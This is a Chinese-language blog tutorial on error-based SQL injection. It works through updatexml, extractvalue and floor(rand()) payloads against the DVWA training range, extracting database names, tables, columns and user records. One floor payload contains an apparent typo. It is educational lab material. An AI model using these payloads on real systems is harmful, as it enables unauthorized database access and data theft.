# SQL注入篇


# SQL 注入篇

## SQL 注入常用函数

```markdown
1.联合注入函数:
concat()、concat_ws()、group_concat() 2.布尔盲注函数:
length()、left()、right()、substr()、mid()、ascii()、ord() 3.时间盲注函数:
sleep()、if() 4.报错注入函数:
floor()、exp()、updatexml()、extractvalue()
```

## (一)注入类型

SQL 注入通常分为两种类型：数字型和字符型

### (1)注入类型为数字型时，SQL 查询语句通常为：

` select * from users where id = x`

判断方法：

```sql
1. ?id = 1 and 1 = 1 --+ 若无报错，继续下一步
2. ?id = 1 and 1 = 2 --+ 若报错， 则注入类型为数字型
```

### (2)注入类型为字符型时，SQL 查询语句通常为：

`select * from users where id = '1'`

判断方法：

```sql
1. ?id = 1' and '1' = '1 --+ 若无报错，继续下一步
2. ?id = 1' and '1' = '2 --+ 若报错， 则注入类型为字符型
```

## (二)报错注入

### 一、SQL 报错注入常用函数：

**updatexml（）**、**extractvalue（）**、**floor（）**

**(1) updatexml（）函数**

- updatexml（）使用不同的 xml 标记匹配和替换 xml 块，用于改变文档中符合条件的节点的值

- 基本语法：`UPDATEXML(xml_target, xpath_expr, new_val)`，`xml_target`是要修改的 XML 类型的数据，`xpath_expr`是一个 XPath 表达式，用于指定要修改的节点位置，`new_val`是一个新的节点值，用于替换当前节点的值

- 若 xpath_string 格式出现错误，mysql 会报出 xpath 语法错误，即（xpath syntax）

- 例如：`select * from users where id = 1 and (updatexml(1,0x7e,3));`0x7e 是字符~，不属于 xpath 语法格式，因此会出现 xpath 语法错误

**(2) extractvalue（）函数**

- extractvalue（）用于从 XML 文档中提取信息

- 基本语法：`ExtractValue(XML_fragment, XPath_string)`，其中`XML_fragment`是 XML 格式的字符串，`XPath_string`是用于定位 XML 文段中特定数据的 XPath 表达式

- 若 xpath_string 格式出现错误，mysql 会报出 xpath 语法错误，即（xpath syntax）

- 例如：`select * from users where id = 1 and (extractvalue(1,0x7e));`

**(3) floor（）函数**

- floor（）利用`select count(*),(floor(rand(0)*2)) as x from 表名 group by x;`导致数据库报错，通过 concat 函数连接注入语句与 floor(rand(0)\*2)函数，实现将注入结果与报错信息回显
- count(\*) 是一个聚合函数，用来计算表中所有行的数量，floor(rand(0)\*2)产生的固定序列为：**01101**，结合 group by 会产生一个虚拟表。
- 原理：rand 伪随机函数与**order by**或**group by**函数的冲突，例如 floor(rand(0)\*2)一开始计算得到了 0，group by 根据 0 分类统计，在写入要返回的虚表时 floor(rand(0)\*2)还要计算一次结果，这次结果却是 1，导致了冲突。

### 二、updatexml 函数实战（基于 dvwa 靶场）

1.爆数据库和用户名：`1' and updatexml(1,concat(0x7e,database(),0x7e,user()),1)#`

输出结果： ![测试结果](images/sql注入篇/1.png)

2.爆当前数据库的表信息：`1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)#`

输出结果： ![测试结果](images/sql注入篇/2.png)

3.爆 dvwa 数据库中的 user 表的字段信息：`1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'),0x7e),1)#`

输出结果： ![测试结果](images/sql注入篇/3.png)

4.爆数据库内容：`1' and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users),0x7e),1)#`

输出结果： ![测试结果](images/sql注入篇/4.png)

### 三、extractvalue 函数实战（基于 dvwa 靶场）

1.爆数据库和用户名：`1' and extractvalue(1,concat(0x7e,database(),0x7e,user()))#`

输出结果： ![测试结果](images/sql注入篇/1.png)

2.爆当前数据库的表信息：`1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database())))#`

输出结果： ![测试结果](images/sql注入篇/2.png)

3.爆 dvwa 数据库中的 user 表的字段信息：`1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = 'dvwa' and table_name = 'users')))#`

输出结果： ![测试结果](images/sql注入篇/3.png)

4.爆数据库内容：`1' and extractvalue(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users),0x7e))#`

输出结果： ![测试结果](images/sql注入篇/4.png)

### 四、floor 函数实战 (基于 dvwa 靶场)

1.判断是否存在报错注入：`1' union select count(*),floor(rand(0)*2) x from information_schema.tables group by x#`

输出结果： ![测试结果](images/sql注入篇/5.png)

确认存在报错注入

2.爆当前数据库名：`1' union select count(*),concat(floor(rand(0)*2),database()) x from information_schema.schemata group by x #`

输出结果： ![测试结果](images/sql注入篇/6.png)

可以看到数据库名为 dvwa，1 是随机数

3.爆当前数据库表信息：`1' union select count(*),concat(floor(0)*2,0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)) x from information_schema.schemata group by x#`

输出结果： ![测试结果](images/sql注入篇/7.png)

4.爆数据库表中字段信息：`1' union select count(*),concat(floor(rand(0)*2),0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users' limit 0,1)) x from information_schema.schemata group by x#`

输出结果： ![测试结果](images/sql注入篇/8.png)

5.爆数据库内容：`1' union select count(*),concat(floor(rand(0)*2),(select group_concat(first_name,last_name) from dvwa.users)) x from information_schema.schemata group by x#`

输出结果： ![测试结果](images/sql注入篇/9.png)


---

> 作者: Hinoatari  
> URL: https://hinoatari.github.io/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/  

